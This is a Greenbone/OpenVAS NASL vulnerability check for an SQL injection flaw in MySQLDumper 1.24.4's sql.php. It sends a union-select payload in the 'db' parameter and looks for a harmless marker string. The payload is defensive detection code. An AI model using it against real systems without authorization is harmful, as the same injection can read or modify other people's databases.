# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mysqldumper:mysqldumper";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903211");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-05-29 12:55:13 +0530 (Wed, 29 May 2013)");
  script_name("MySQLDumper SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.1337day.com/exploit/17551");
  script_xref(name:"URL", value:"http://fuzzexp.org/exp/exploits.php?id=95");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("sw_mysqldumper_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mysqldumper/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary SQL statements on the vulnerable system, which may leads to access
  or modify data in the underlying database.");

  script_tag(name:"affected", value:"MySQLDumper version 1.24.4.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of input passed via the
  'db' parameter in sql.php script.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one.");

  script_tag(name:"summary", value:"MySQLDumper is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/sql.php?db=-'%20union%20select%201,2," +
            "'VT-SQL-Injection-Test'%20from%20tblusers%20where%20'1";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
                     pattern:"vt-sql-injection-test",
                     extra_check: make_list( "Database", "Table View" ) ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
